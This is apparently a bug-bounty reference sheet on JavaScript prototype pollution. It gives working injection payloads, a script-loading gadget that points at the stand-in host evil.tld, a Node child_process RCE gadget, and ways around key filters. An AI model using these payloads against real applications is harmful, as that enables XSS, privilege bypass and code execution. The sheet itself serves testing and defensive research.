# Prototype Pollution

A JavaScript-specific flaw where you inject properties into `Object.prototype`, and because nearly every object inherits from it, your injected property silently appears on objects all over the application. On its own it is often benign; chained with a "gadget" that reads a polluted property, it becomes XSS, auth bypass, or RCE.

## The mental model

In JS, objects inherit from `Object.prototype`. If code merges attacker-controlled data into an object using a recursive merge, clone, or path-set that does not guard the special keys `__proto__`, `constructor`, and `prototype`, you can write to the shared prototype. After pollution, any code that reads an unset property (e.g. `options.isAdmin`, `config.allowHtml`) gets your injected value as the inherited default. The pollution is the primitive; a "gadget" turns it into impact.

## Where it hides / tell-tales

- **Recursive merge / extend / clone**: `merge`, `extend`, `defaultsDeep`, `set`, `assign`-deep implementations, especially older `lodash`, `jQuery.extend(true, ...)`, `hoek`, `deep-merge`, and hand-rolled recursive copies.
- **User-controlled keys reaching those functions**: query strings parsed into nested objects (`?a[__proto__][x]=1` via `qs`), JSON bodies, config files, YAML, and form data with bracket notation.
- **Client-side (DOM) pollution**: URL params parsed into objects and merged, then read by a sink (sanitizer config, template options, script src). Leads to DOM XSS.
- **Server-side (Node) pollution**: a polluted prototype property later read by Express, a template engine, a child-process spawn options object, or a security check. Leads to auth bypass, SSRF, or RCE.

## Real material

The injection forms:

```
# query string (parsed by qs/Express)
?__proto__[admin]=true
?constructor[prototype][admin]=true
# JSON body
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
# nested path set
{"a": {"b": {"__proto__": {"polluted": "yes"}}}}
```

Confirming pollution in a console (or via a reflected gadget):

```js
({}).polluted            // undefined before
// send {"__proto__":{"polluted":"yes"}} through the vulnerable merge
({}).polluted            // "yes" after  -> every object now has it
```

Client-side gadget to XSS (pollute a property a library reads for a script source or HTML sink):

```
# if the app does: let s = cfg.src || default;  document.createElement('script').src = s
?__proto__[src]=//evil.tld/x.js
# if a sanitizer reads an option like ALLOWED_TAGS/hooks from the prototype:
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

Server-side gadget to RCE (pollute child_process spawn options, a known Node gadget):

```json
{"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/environ",
  "argv0": "node", "env": {"EVIL": "console.log(require('child_process').execSync('id').toString())"}}}
```
The exact gadget depends on what the app later spawns; the principle is that `spawn`/`exec` reads options (`shell`, `env`, `NODE_OPTIONS`) from an object that now inherits attacker values.

## Beyond the basics

- **Pollution plus gadget is the real bug**: finding pollution is easy; finding a gadget that reads a polluted property in a dangerous way is the work. Map what unset properties the app reads: template options, sanitizer configs, routing, `NODE_OPTIONS`/`env`, `Content-Type` defaults, and security flags. Research has catalogued gadgets per library (lodash, EJS, Pug, Handlebars, Express) and in Node internals.
- **Auth and logic bypass**: pollute a default that a check reads. If code does `if (user.isAdmin)` and `isAdmin` is normally absent for regular users, polluting `Object.prototype.isAdmin = true` makes everyone admin. Same for `isVerified`, `canEdit`, feature flags, and allowlist defaults.
- **DoS and type confusion**: polluting properties like `Object.prototype.length` or ones used in loops/JSON serialization can crash the app; note as DoS.
- **Blind server-side pollution detection**: when you cannot read objects, confirm pollution via a status/behavior change (pollute a property that alters a response header, error, or template output), or trigger a known gadget that makes an outbound request (SSRF/OOB) to your server.
- **Framework-specific gadget chains**: EJS and Pug template-option pollution leading to RCE, Express `query parser` pollution, and client-side sanitizer (DOMPurify config) pollution leading to mXSS. Keep an updated gadget list because patches target specific chains while the primitive persists.
- **Protection bypasses**: `Object.freeze(Object.prototype)` and key-blocking (`__proto__` filtered) can be bypassed via `constructor.prototype`, via `Object.defineProperty` edge cases, or when the block checks only the top-level key but you nest it.

## What to watch for

- Pollution alone is usually not reportable impact; find and demonstrate a gadget (XSS, bypass, RCE) for a strong report, or at least show a concrete security-relevant default being overridden.
- `__proto__` may be filtered while `constructor.prototype` is not; try both.
- Fixes often `null`-prototype the merge target or block the keys; confirm the primitive still works on the current version.
- RCE gadgets run code on the server; use harmless commands and OOB proof; do not pivot without authorization.

## Hunting checklist

- Identify recursive merge/clone/set functions and whether user-controlled keys reach them.
- Inject `__proto__` and `constructor.prototype` via query (bracket notation) and JSON body.
- Confirm pollution with a probe property, including blind detection via behavior change.
- Map properties the app reads unset (template/sanitizer options, `env`/`NODE_OPTIONS`, security flags) and find a gadget.
- For client-side, trace URL-param merges into DOM sinks for XSS.
- Try `constructor.prototype` when `__proto__` is blocked.
